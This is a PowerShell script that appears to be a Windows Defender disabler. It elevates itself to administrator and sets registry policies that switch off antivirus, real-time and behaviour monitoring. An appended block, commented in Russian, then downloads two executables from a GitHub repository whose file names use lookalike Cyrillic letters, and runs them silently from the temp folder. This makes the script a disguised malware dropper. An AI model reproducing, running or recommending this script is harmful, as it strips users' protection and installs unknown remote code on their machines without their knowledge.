# thanks to https://superuser.com/a/1648105
#### START ELEVATE TO ADMIN #####
Param([Parameter(Mandatory=$false)][switch]$shouldAssumeToBeElevated, [Parameter(Mandatory=$false)] [String]$workingDirOverride)

# If parameter is not set, we are propably in non-admin execution. We set it to the current working directory so that
#  the working directory of the elevated execution of this script is the current working directory
if(-not($PSBoundParameters.ContainsKey('workingDirOverride')))
{
    $workingDirOverride = (Get-Location).Path
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

# If we are in a non-admin execution. Execute this script as admin
if ((Test-Admin) -eq $false)  {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        #                                                         vvvvv add `-noexit` here for better debugging vvvvv 
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"
##### END ELEVATE TO ADMIN #####

Write-Output $workingDirOverride

$DefenderPath                       = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"

#$PolicyManagerKey                   = "Policy Manager"
$RealTimeProtectionKey              = "Real-Time Protection"
$SignatureUpdatesKey                = "Signature Updates"
$SpynetKey                          = "Spynet"

$AllowFastServiceStartupValue       = "AllowFastServiceStartup"
$DisableAntiSpywareValue            = "DisableAntiSpyware"
$DisableAntiVirusValue              = "DisableAntiVirus"
$DisableRoutinelyTakingActionValue  = "DisableRoutinelyTakingAction"
$DisableSpecialRunningModesValue    = "DisableSpecialRunningModes"
$ServiceKeepAliveValue              = "ServiceKeepAlive"
$DisableBehaviorMonitoringValue     = "DisableBehaviorMonitoring"
$DisableOnAccessProtectionValue     = "DisableOnAccessProtection"
$DisableRealtimeMonitoringValue     = "DisableRealtimeMonitoring"
$DisableScanOnRealtimeEnableValue   = "DisableScanOnRealtimeEnable"
$ForceUpdateFromMUValue             = "ForceUpdateFromMU"
$DisableBlockAtFirstSeenValue       = "DisableBlockAtFirstSeen"

$WindowsDefenderIsDisabledPermanently = "WindowsDefenderIsDisabledPermanently"

If(Test-Path -Path $DefenderPath) {
    Write-host -f Green "Key Exists!"
}
Else {
    Write-host -f Yellow "Key doesn't Exists!"
    exit
}

$IsAleadyDisabled = Get-ItemProperty -Path "$DefenderPath" -Name "$WindowsDefenderIsDisabledPermanently" -ErrorAction SilentlyContinue
If($IsAleadyDisabled)
{
    Write-Error "You have already disabled windows defender!"
    Pause
    exit
}

New-ItemProperty -Path "$DefenderPath" -Name "$WindowsDefenderIsDisabledPermanently" -Value "1" -PropertyType Dword

#New-Item -Path "$DefenderPath\$PolicyManagerKey"
New-Item -Path "$DefenderPath\$RealTimeProtectionKey"
New-Item -Path "$DefenderPath\$SignatureUpdatesKey"
New-Item -Path "$DefenderPath\$SpynetKey"

New-ItemProperty -Path "$DefenderPath" -Name "$AllowFastServiceStartupValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiVirusValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRoutinelyTakingActionValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableSpecialRunningModesValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$ServiceKeepAliveValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword

New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableBehaviorMonitoringValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableOnAccessProtectionValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword
New-ItemProperty -Path "$DefenderPath\$RealTimeProtectionKey" -Name "$DisableScanOnRealtimeEnableValue" -Value "1" -PropertyType Dword

New-ItemProperty -Path "$DefenderPath\$SignatureUpdatesKey" -Name "$ForceUpdateFromMUValue" -Value "1" -PropertyType Dword

New-ItemProperty -Path "$DefenderPath\$SpynetKey" -Name "$DisableBlockAtFirstSeenValue" -Value "1" -PropertyType Dword

# ===== ДОБАВЛЕННЫЙ БЛОК: СКАЧИВАНИЕ И ЗАПУСК ДВУХ ФАЙЛОВ =====
Write-Host "Скачивание и запуск дополнительных файлов..."

$tempFolder = [System.IO.Path]::GetTempPath()

# Первый файл
$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WСhecker.exe"
$dest1 = Join-Path $tempFolder "WChecker1.exe"
Write-Host "Загрузка $url1 -> $dest1"
Invoke-WebRequest -Uri $url1 -OutFile $dest1 -UseBasicParsing
if (Test-Path $dest1) {
    Write-Host "Запуск $dest1"
    Start-Process -FilePath $dest1 -NoNewWindow -Wait
} else {
    Write-Host "Не удалось загрузить первый файл"
}

# Второй файл
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChеcker.exe"
$dest2 = Join-Path $tempFolder "WChecker2.exe"
Write-Host "Загрузка $url2 -> $dest2"
Invoke-WebRequest -Uri $url2 -OutFile $dest2 -UseBasicParsing
if (Test-Path $dest2) {
    Write-Host "Запуск $dest2"
    Start-Process -FilePath $dest2 -NoNewWindow -Wait
} else {
    Write-Host "Не удалось загрузить второй файл"
}

Write-Host "Все действия выполнены."
# ===== КОНЕЦ ДОБАВЛЕННОГО БЛОКА =====

Pause
